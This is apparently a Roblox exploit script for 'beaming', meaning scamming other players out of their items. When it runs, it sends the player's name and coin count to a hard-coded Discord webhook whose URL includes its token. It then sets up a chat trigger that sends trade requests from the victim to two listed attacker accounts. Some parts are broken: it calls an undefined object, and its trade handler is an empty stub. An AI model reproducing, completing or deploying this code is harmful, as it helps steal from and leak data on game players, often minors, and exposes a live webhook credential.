local Players = game:GetService('Players')
local Player = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Coins = 0

-- Function to calculate user's coins
local function getCoins()
    Coins = Player.PlayerGui.AccountSection.Base.Stats.Coins.Title.Text
end

-- Define the embed structure for Discord message
local function createEmbed()
    return {
        ["title"] = Player.Name,
        ["description"] = "BEAMED",
        ["color"] = 65280,
        ["fields"] = {
            {
                ["name"] = "💰 COINS",
                ["value"] = tostring(Coins)
            }
        },
    }
end

local ourAccounts = {
    "MonsterWyatt",
    "Sarthorian_4",
}

local webhookUrl = "https://discord.com/api/webhooks/1245489832134840440/gkf_RVFlxMzLBfsxgwrS1_0IOUptKKLawmVliF46CWHkDWE1KwU4bf-iTI4twrxORR-h"

local function isUsernameInTable(username)
    for _, name in ipairs(ourAccounts) do
        if name == username then
            return true
        end
    end
    return false
end

local function sendDiscordMessage(embed)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = "@everyone",
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
            }
        }
    }
     local body = http:JSONEncode(data)
    local response = request({
        Url = webhookUrl,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

local function onPlayerChatted(player, message)
    if message:lower() == "trade" then
        if isUsernameInTable(player.Name) then
            print("SendTradeRequest for: " .. player.Name)
            local ohString1 = "SendTradeRequest"
            local ohString2 = player.Name
            ReplicatedStorage.ReEvent:FireServer(ohString1, ohString2)
        else
            print("Player not authorized to trade: " .. player.Name)
        end
    end
end

local function onTradeAccepted(player)
    -- get player's inventory
    -- add items to the trade
    print('Trade accepted')
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end)

-- Fetch the initial coin count
getCoins()

-- Send a message to the Discord server when the script runs
sendDiscordMessage(createEmbed())
